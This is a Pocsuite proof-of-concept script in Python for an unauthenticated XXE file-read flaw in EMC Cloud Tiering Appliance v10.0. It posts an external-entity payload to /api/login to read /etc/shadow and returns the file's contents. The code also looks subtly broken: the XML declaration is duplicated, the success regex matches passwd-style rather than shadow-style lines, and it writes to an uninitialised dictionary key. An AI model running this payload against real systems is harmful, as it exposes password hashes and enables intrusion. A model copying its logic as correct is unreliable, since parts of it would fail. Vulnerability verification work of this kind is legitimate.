#!/usr/bin/env python
# coding: utf-8
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register
import re

class TestPOC(POCBase):
    vulID = '85903'  # ssvid
    version = '1.0'
    author = ['kikay']
    vulDate = '2014-04-16'
    createDate = '2015-11-12'
    updateDate = '2015-11-12'
    references = ['http://www.sebug.net/vuldb/ssvid-85903']
    name = 'EMC Cloud Tiering Appliance v10.0 Unauthenticated XXE Arbitrary File Read'
    appPowerLink = 'N/A'
    appName = 'EMC Cloud Tiering Appliance'
    appVersion = '10.0'
    vulType = 'XXE'
    desc = '''
        EMC Cloud Tiering Appliance（CTA）是美国易安信（EMC）公司的一套基于策略的文件分层、
        归档和迁移解决方案。该方案通过自动化文件分层、文件归档和文件迁移等功能优化网络存储（NAS）基础架构。
        该架构的v10.0版本的/api/login处存在XXE漏洞，导致可以读取任意文件
    '''
    samples = ['']

    def _attack(self):
        result = {}
        return self.parse_output(result)

    def _verify(self):
        result = {}
        #下面以尝试读取/etc/shadow为例子进行测试
        filename='/etc/shadow'
        payload=r'<?xml version="1.0" encoding="ISO-8859-1"?>'\
                 '<?xml version="1.0" encoding="ISO-8859-1"?>'\
                 '<!DOCTYPE foo ['\
                 '<!ELEMENT foo ANY >'\
                 '<!ENTITY xxe SYSTEM "file://{file}" >]>' \
                 '<Request>'\
                 '<Username>root</Username>'\
                 '<Password>root</Password>'\
                 '</Request>'.format(file=filename)

        expurl='{url}/api/login'.format(url=self.url)
        try:
            response=req.post(expurl,data=payload,headers=self.headers, timeout=50)
            if re.match('root:.+?:0:0:.+?:.+?:.+?', response.content) and response.status_code==200:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = expurl
                result['Fileinfo']['Filename']=filename
                result['Fileinfo']['Content']=response.content
            else:
                result={}
        except:
            result={}
        return self.parse_output(result)

    def parse_output(self, result):
        #parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)